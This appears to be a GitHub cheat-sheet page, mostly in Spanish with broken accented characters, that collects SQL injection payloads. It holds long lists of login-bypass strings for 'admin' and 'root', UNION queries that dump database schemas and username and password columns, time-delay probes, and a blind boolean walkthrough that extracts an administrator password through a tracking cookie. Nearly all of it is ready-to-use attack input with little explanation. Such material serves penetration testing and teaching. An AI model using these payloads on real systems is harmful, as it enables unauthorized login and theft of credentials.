# SQLi
This is how SQL Injection works:
- [LoginByPass](https://github.com/erik-451/SQLi/blob/main/LoginByPass.md)
- [PortSwigger CheatSheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

![SQLi](https://user-images.githubusercontent.com/47476901/124319507-3bbe1600-db72-11eb-976f-872635141ea9.PNG)

### 1- Login inyection
Estos payloads hacen referencia inyeciones de consultas de sql, tambien se pueden usar en los logins para conseguir el usuario de administrador generalmente.
```bash
or 1=1
or 1=1--
or 1=1#
or 1=1/*
' or 1=1
' or 1=1--
' or 1=1#
' or 1=1 #
' or 1=1/*
" or 1=1
" or 1=1--
" or 1=1#
" or 1=1/*

---

1' or '1'='1

---

admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*

admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin' or 1=1-- -
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*

---

root' --
root' #
root'/*
root' or '1'='1
root' or '1'='1'--
root' or '1'='1'#
root' or '1'='1'/*
root'or 1=1 or ''='
root' or 1=1
root' or 1=1--
root' or 1=1#
root' or 1=1/*
root') or ('1'='1
root') or ('1'='1'--
root') or ('1'='1'#
root') or ('1'='1'/*
root') or '1'='1
root') or '1'='1'--
root') or '1'='1'#
root') or '1'='1'/*

root" --
root" #
root"/*
root" or "1"="1
root" or "1"="1"--
root" or "1"="1"#
root" or "1"="1"/*
root" or 1=1 or ""="
root" or 1=1
root" or 1=1--
root" or 1=1#
root" or 1=1/*
root") or ("1"="1
root") or ("1"="1"--
root") or ("1"="1"#
root") or ("1"="1"/*
root") or "1"="1
root") or "1"="1"--
root") or "1"="1"#
root") or "1"="1"/*
```
------------------------------------------
### 2- Determinar el n??mero de columnas necesarias en un ataque UNION de inyecci??n SQL
```sql
' ORDER BY 1--
```
Podemos ir testeando este payload para determinar cuantas columnas necesitamos. Ej: si con el payload del numero 3 significa que
la posici??n ORDER BY n??mero 3 est?? fuera del rango del n??mero de elementos en la lista de selecci??n.

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc ...
```

------------------------------------------
### 3- SQL injection UNION attacks
```sql
SELECT A, B FROM table1 UNION SELECT C, D FROM table2
```
Esta consulta SQL devolver?? un ??nico conjunto de resultados con dos columnas, que contienen los valores de las columnas A y B en la tabla1 y las columnas C y D en la tabla2.
```sql
union select 1,2-- -
union select 1,@@version
union select all 1,database()
union select all 1,table_schema from information_schema.tables 
union select all 1,table_name from information_schema.tables where table_schema='sysadmin' 
union select all 1,column_name from information_schema.columns where table_name='users' 
union select 1,(select group_concat(username,password) from sysadmin.users) 

' UNION SELECT username, password FROM users--
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc ...
```
------------------------------------------
### 4- Time delays
Los Time Delays crean un tiempo de espera al recibir la peticion cuando se ejecutan.

Delay de 5 segundos:
```sql
')) or sleep(5)='
```
Estos payloads se usan para testear si existe una inyeccion SQL porque no suponen un riesgo para la base de datos.

```sql
')) or sleep(5)='
' WAITFOR DELAY '0:0:5'--
';WAITFOR DELAY '0:0:5'-- 
;waitfor delay '0:0:5'--
);waitfor delay '0:0:5'--
';waitfor delay '0:0:5'--
";waitfor delay '0:0:5'--
');waitfor delay '0:0:5'--
");waitfor delay '0:0:5'--
));waitfor delay '0:0:5'--
```
------------------------------------------
### 5- Inyecci??n SQL ciega
La inyecci??n SQL ciega surge cuando una aplicaci??n es vulnerable a la inyecci??n SQL, pero sus respuestas HTTP no contienen los resultados de la consulta SQL relevante o los detalles de los errores de la base de datos.
Es decir no se reflejan en la web. Pero una forma es ir comprobando estas consultas atrav??s de las cookies de seguimiento.
Por ejemplo:
```http
Cookie: TrackingId= e8IU14F6r1xyz
```
Suponiendo que hay una tabla llamada "Users" con las columnas "Username" y "Password", y un usuario llamado "Administrador". Podemos determinar sistem??ticamente la contrase??a para este usuario enviando una serie de entradas para probar la contrase??a un car??cter a la vez.

Para hacer esto, comenzamos con la siguiente entrada:
```sql
Cookie: TrackingId= e8IU14F6r1xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrador'), 1, 1) > 'a
```
Esto devuelve el mensaje "Bienvenido de nuevo", que indica que la condici??n inyectada es verdadera, por lo que el primer car??cter de la contrase??a es mayor que a.

A continuaci??n, enviamos la siguiente entrada:
```sql
Cookie: TrackingId= e8IU14F6r1xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrador'), 1, 1) > 'c
```
Esto no devuelve el mensaje "Bienvenido de nuevo", lo que indica que la condici??n inyectada es falsa, por lo que el primer car??cter de la contrase??a no es mayor que c.

Finalmente, enviamos la siguiente entrada, que devuelve el mensaje "Bienvenido de nuevo", confirmando as?? que el primer car??cter de la contrase??a es b:
```sql
Cookie: TrackingId= e8IU14F6r1xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrador'), 1, 1) = 'b
```
Podemos continuar este proceso para determinar sistem??ticamente la contrase??a completa para el usuario Administrador.

